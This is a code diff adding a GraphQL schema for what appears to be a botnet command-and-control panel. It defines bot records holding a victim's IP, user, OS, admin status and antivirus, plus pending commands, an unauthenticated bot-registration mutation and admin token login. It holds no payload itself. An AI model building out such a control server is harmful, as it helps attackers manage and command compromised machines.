@@ -1,0 +1,55 @@
+directive @IsAuthenticated on QUERY | FIELD
+schema {
+  query: Query
+  mutation: Mutation
+}
+
+type Admin {
+  id: ID!
+  username: String!
+}
+
+type Bot {
+  id: ID!
+  ip: String!
+  whoAmI: String!
+  os: String!
+  installDate: String!
+  admin: Boolean!
+  av: String!
+  cpu: String!
+  gpu: String!
+  version: String!
+  lastCheckin: String
+  lastCommand: String
+  newCommand: String
+}
+
+input NewBot {
+  ip: String!
+  whoAmI: String!
+  os: String!
+  installDate: String!
+  admin: Boolean!
+  av: String!
+  cpu: String!
+  gpu: String!
+  version: String!
+}
+
+type Query {
+  me: Admin @IsAuthenticated
+  bots: [Bot!]! @IsAuthenticated
+  bot(id: ID!): Bot
+}
+
+type Mutation {
+  createBot(input: NewBot!): Bot!
+  createAdmin(
+    username: String!
+    password: String!
+    passwordConfirm: String!
+  ): Admin!
+  tokenAuth(username: String!, password: String!): String!
+  # verifyToken(token: String!):
+}
